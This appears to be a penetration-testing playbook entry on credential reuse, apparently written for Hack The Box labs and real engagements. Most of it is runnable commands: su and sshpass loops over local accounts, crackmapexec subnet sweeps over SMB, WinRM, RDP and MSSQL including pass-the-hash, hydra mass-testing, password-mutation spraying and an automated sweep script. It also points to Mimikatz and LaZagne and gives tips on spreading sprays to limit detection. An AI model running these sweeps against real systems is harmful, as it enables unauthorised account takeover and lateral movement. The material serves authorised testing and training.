# Credential Reuse

> Try every credential everywhere. Half of HTB chains and most
> real-world breaches advance via reused passwords.

## Objective
Maximise the value of every harvested credential by testing it against
every account and every service in scope.

## When To Use
The moment you obtain *any* credential (cleartext, NTLM hash, SSH key,
API token, browser-stored).

## Detection Indicators
You don't trigger on this — you *do* it preventatively after every
credential acquisition.

## Enumeration Strategy

For each new credential `<u>:<p>`:

### 1. Test against every system account on this host

```bash
# Linux
cut -d: -f1 /etc/passwd | grep -vE '^(daemon|bin|sys|sync|games|man|lp|mail|news|uucp|proxy|www-data|backup|list|irc|gnats|nobody|systemd-network|systemd-resolve|messagebus|sshd)$' \
  > local-users.txt
while read u; do echo "$u : "; echo "<p>" | timeout 3 su -c id "$u" 2>&1 | grep -v "Authentication"; done < local-users.txt
```

### 2. Test against every service on this host

```bash
# SSH (every user)
for u in $(cat local-users.txt); do sshpass -p '<p>' ssh -o StrictHostKeyChecking=no $u@<ip> id 2>/dev/null && echo "✓ $u"; done

# MySQL / Postgres / MSSQL (with the same user as discovered)
mysql -u<u> -p'<p>' -e "select user();"
psql -h <ip> -U <u> -W -c "select current_user"
```

### 3. Test against every other host in scope

```bash
# crackmapexec sweep (Windows hosts)
crackmapexec smb 10.10.10.0/24 -u <u> -p '<p>'
crackmapexec smb 10.10.10.0/24 -u <u> -p '<p>' --local-auth   # local accounts
crackmapexec winrm 10.10.10.0/24 -u <u> -p '<p>'
crackmapexec rdp 10.10.10.0/24 -u <u> -p '<p>'

# pass-the-hash form
crackmapexec smb 10.10.10.0/24 -u <u> -H <NTLM> --local-auth
```

### 4. Try common mutations

```bash
# add !, 1, !1, 123, year, exclamation
for suffix in '' '!' '1' '!1' '01' '123' '2023' '2024' '!1' '@' '#'; do
  echo "<p>$suffix"
done | crackmapexec smb <ip> -u <u> -p -
```

## Exploitation Workflow

1. Capture every credential to a structured file:
   ```
   creds.csv
   user,password,source,verified_against
   jimmy,n1nj4WarR10R!,/opt/ona/.../config.inc.php,ssh
   ```
2. After each acquisition, run all four tests above.
3. Update the credential matrix.
4. Pause exploitation when no new creds yield results; resume only
   after enumeration produces new candidates.

## Commands

```bash
# Mass-test cleartext password against many users (Linux)
hydra -L users.txt -p '<p>' ssh://<ip> -t 4

# Mass-test NTLM hash across hosts (Windows)
crackmapexec smb <range> -u <u> -H <NTLM> --local-auth

# Test against MSSQL
crackmapexec mssql <ip> -u <u> -p '<p>'

# Validate an SMB credential pair
crackmapexec smb <ip> -u <u> -p '<p>'
# response shows whether it's local admin (Pwn3d!) or just valid
```

## Tool Usage

- `crackmapexec` — the standard sweep tool; supports SMB, WinRM, MSSQL,
  RDP, SSH, FTP.
- `hydra` — for non-Windows services (SSH, FTP, RDP, MySQL, etc.).
- `medusa` — alternative to hydra.
- `sshpass` — wrap ssh with a password (lab use only — leaks the
  password to argv).

## Common Mistakes

| Mistake | Symptom | Fix |
|---|---|---|
| Forgetting `--local-auth` | Sweep shows no hits despite reuse | Add the flag for local accounts |
| Assuming "valid cred" means "admin cred" | Excited then stuck | CME's "Pwn3d!" indicates admin; otherwise just valid |
| Spraying without lockout policy check | Lockouts | Pull `getdompwinfo` first |
| Not trying the same password as a different user | Miss obvious | Always reuse cred against all known users |
| Forgetting browser-stored passwords | Miss easy creds | Run `LaZagne` / Mimikatz where applicable |

## Decision-Making Logic

```
new credential captured →
  ├─ try as same user on all services on this host
  ├─ try as every other user on this host
  ├─ try across the network (smb/winrm/ssh)
  ├─ try with mutations (suffix, year, !)
  └─ document; move on
```

## Pivot Opportunities

Each successful reuse is itself a foothold expansion — re-run
post-exploitation enumeration as the new identity.

## OPSEC Considerations
- Mass spraying generates 4625 events on Windows / SSH log entries on
  Linux. Spread across time on real engagements.
- `--continue-on-success` in crackmapexec is your friend; without it,
  CME stops at the first hit.
- Many wordlist/spray tools lock accounts; the "spray *one* password
  per user per period" pattern is the safest.

## Real HTB Examples

- **OpenAdmin** — ONA DB password reused for `jimmy` system account.
- **Magic** — DB password reused.
- **Postman** — Redis-discovered key passphrase reused.
- **Sniper** — admin password reused via SMB.
- **Curling** — config-disclosed cred reused for SSH.
- **Networked** — config-disclosed cred reused.
- **Bastion, Resolute, Sauna, Cascade** — credential reuse is
  fundamental to the chain.

## Alternative Techniques

- **Pass-the-Hash** — when the cred is an NTLM hash; covered in
  `methodology/10-lateral-movement.md`.
- **Pass-the-Ticket** — Kerberos analogue.
- **Token impersonation** — when reuse isn't possible but a privileged
  token is in memory.

## Automation Opportunities

```bash
# crackmapexec sweep that records every hit
for cred_line in $(cat creds.csv); do
  u=$(echo $cred_line | cut -d, -f1)
  p=$(echo $cred_line | cut -d, -f2)
  crackmapexec smb 10.10.10.0/24 -u "$u" -p "$p" --continue-on-success >> sweep.log
done
```

## Checklist

- [ ] Cred captured → added to `creds.csv`
- [ ] Tested against every local account
- [ ] Tested against every service on this host (SSH/SMB/WinRM/DB)
- [ ] Tested across the network (CME sweep)
- [ ] Tried 5–10 obvious mutations
- [ ] Updated `creds.csv` with new hits

## Related Skills

- [`linux-privesc/sudo-gtfobins.md`](sudo-gtfobins.md)
- [`password-attacks/password-spraying.md`](../password-attacks/password-spraying.md)
- [`tool-usage/crackmapexec.md`](../tool-usage/crackmapexec.md)
- [`methodology/09-credential-hunting.md`](../methodology/09-credential-hunting.md)
- [`methodology/10-lateral-movement.md`](../methodology/10-lateral-movement.md)
